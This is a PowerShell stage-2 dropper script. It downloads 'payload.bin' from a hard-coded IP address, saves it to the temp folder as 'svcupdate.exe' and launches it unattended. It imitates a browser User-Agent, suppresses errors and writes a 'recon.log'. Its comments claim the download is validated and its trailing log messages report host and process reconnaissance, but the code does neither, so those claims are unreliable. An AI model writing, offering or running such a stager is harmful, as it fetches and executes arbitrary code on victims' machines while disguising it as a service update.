
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://192.0.2.126:8443/downloads/payload.bin',
    [string]$Stage2Path = "$env:TEMP\svcupdate.exe",
    [string]$LogPath = "$env:TEMP\recon.log",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$RequestTimeout = 116,
    [int]$RetryCount = 3,
    [int]$RetryDelaySeconds = 7
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 3,
        [int]$RetryDelay = 7,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $DownloadUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $Stage2Path -RetryCount $RetryCount -RetryDelay $RetryDelaySeconds -UserAgent $BrowserAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $Stage2Path -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $DownloadUrl
    Destination = $Stage2Path
    RetryCount = $RetryCount
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Checking local path"
Write-Verbose "Stage handoff finished"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "Applying operation timeout"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Start-Sleep -Seconds 36
Write-Verbose "stage marker 3 reached"
